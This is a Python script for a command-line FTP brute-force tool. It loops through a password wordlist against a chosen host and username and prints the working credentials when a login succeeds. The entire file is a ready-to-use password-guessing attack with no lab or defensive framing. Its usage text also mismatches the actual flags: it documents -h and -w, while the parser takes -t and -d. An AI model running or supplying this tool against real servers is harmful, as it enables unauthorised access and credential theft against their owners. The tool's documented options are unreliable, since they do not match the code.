# -*- coding: utf-8 -*-
# python 3
import sys
import argparse
from ftplib import FTP

author = 'Paul Adams'
github = 'https://github.com/pauladams8'

info = '''
Usage: ftpforce [options]\n
Options: -h, --host       <hostname/ip>   |   Host\n
         -p  --port       <port>          |   Port (optional)\n
         -u, --user       <user>          |   Username\n
         -w, --dictionary <filename>      |   Dictionary\n
         -h, --help       <help>          |   Print help\n

Example: ftpforce -h 192.168.1.1 -u root -w ~/dictionary.txt
'''

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--host")
    parser.add_argument("-p", "--port")
    parser.add_argument("-u", "--username")
    parser.add_argument("-d", "--dictionary")

    print('[i] Welcome to FTP brute force')
    print('[i] Written by {}'.format(author))
    print('[i] Github: {}'.format(github))

    args = parser.parse_args()

    required = ["host", "username", "dictionary"]
    valid = True

    for arg in required:
        if not getattr(args, arg):
            valid = False
            print("[❌] {} is required".format(arg.capitalize()))

    if not valid:
        sys.exit(0)

    host = args.host
    port = int(args.port or 21)
    username = args.username
    dictionary = args.dictionary

    try:
        brute_force(host, port, username, dictionary)
    except KeyboardInterrupt:
        print("\n[i] Goodbye")
        sys.exit(0)
    except Exception:
        print("[❌] Failed to login to the FTP server using the supplied dictionary.")

def help():
    print(info)
    sys.exit(0)


def ftp_login(host, port, username, password):
    try:
        ftp = FTP()
        print('[i] Connecting...')
        ftp.connect(host, port)
        print('[i] Connected')
        print('[i] Attempting password {}...'.format(password))
        ftp.login(username, password)
        ftp.quit()
        print("[✅] Login successful!")
        print("[i] Username : {}".format(username))
        print("[i] Password : {}".format(password))
        sys.exit(0)
    except Exception as e:
        print('[i] {}. Failed to connect with password {}.'.format(str(e), password))


def brute_force(host, port, username, dictionary):
    try:
        dictionary = open(dictionary, "r")
    except Exception:
        print("[❌] Dictionary file does not exist")
        sys.exit(0)
    words = dictionary.readlines()
    for word in words:
        word = word.strip()
        ftp_login(host, port, username, word)

main() # start the script
